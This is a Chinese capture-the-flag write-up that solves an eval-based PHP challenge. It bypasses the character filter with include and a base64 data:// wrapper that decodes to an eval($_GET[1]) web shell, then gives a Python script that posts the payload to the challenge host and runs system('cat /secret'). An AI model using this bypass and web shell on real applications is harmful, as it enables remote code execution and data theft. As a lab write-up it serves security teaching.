先看代码
~~~
<?php


if(check($code)){

    eval('$result='."$code".";");
    echo($result);    
}

function check(&$code){

    $num1=$_POST['num1'];
    $symbol=$_POST['symbol'];
    $num2=$_POST['num2'];

    if(!isset($num1) || !isset($num2) || !isset($symbol) ){
        
        return false;
    }

    if(preg_match("/!|@|#|\\$|\%|\^|\&|\(|_|=|{|'|<|>|\?|\?|\||`|~|\[/", $num1.$num2.$symbol)){
        return false;
    }

    if(preg_match("/^[\+\-\*\/]$/", $symbol)){
        $code = "$num1$symbol$num2";
        return true;
    }

    return false;
}

~~~
从题目代码来看，是输入3个值，分别是num1、符号值、num2\
然后过滤了一大堆符号，这种就是最直接的提示，没过滤哪个，就用哪个\
然后把3个值拼接起来进行执行\
既然是eval就是代码执行，但是又不能用括号，那么只能用不用括号的函数了，那么答案很显然\
php中不需要括号使用的函数，叫做语言结构，常见的有include、require、echo等

那么思路有了，要使用include来执行代码，那么显而易见，肯定要用到伪协议了\
我们只需要构造出一个data的伪协议看看\
正常的伪协议包含是这样的
~~~
include "data://text/plain,<?php phpinfo();?>"
~~~
但是呢，题目不能用括号和< 随意需要对执行的代码进行编码\
使用data协议的第二种写法
~~~
include "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
~~~
观察符号，刚好都在可以用的范围之内\
可以拆分给三个变量分别复制
~~~
$num1 = "include data:/";
$symbol = "/";
$num2 = "text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"

$num1$symbol$num2="include data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
~~~
放到eval里面后，就能代码执行了,使用更优雅的写法
~~~
num1=include "data:ctfshow&symbol=/&num2=b;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4";
~~~
python 脚本如下：
~~~
import requests

url="http://ce01537e-72f8-4ac1-adc8-d034957ad28b.challenge.ctf.show/"

def flag():
    data={
        "num1": 'include "data:ctfshow',
        "symbol": "/",
        "num2": 'b;base64,PD9waHAgZXZhbCgkX0dFVFsxXSk7Pz4";'
    }
    response=requests.post(url=url+"?1=system('cat /secret');die();",data=data)
    print(response.text)

if __name__=='__main__':
    flag()
~~~
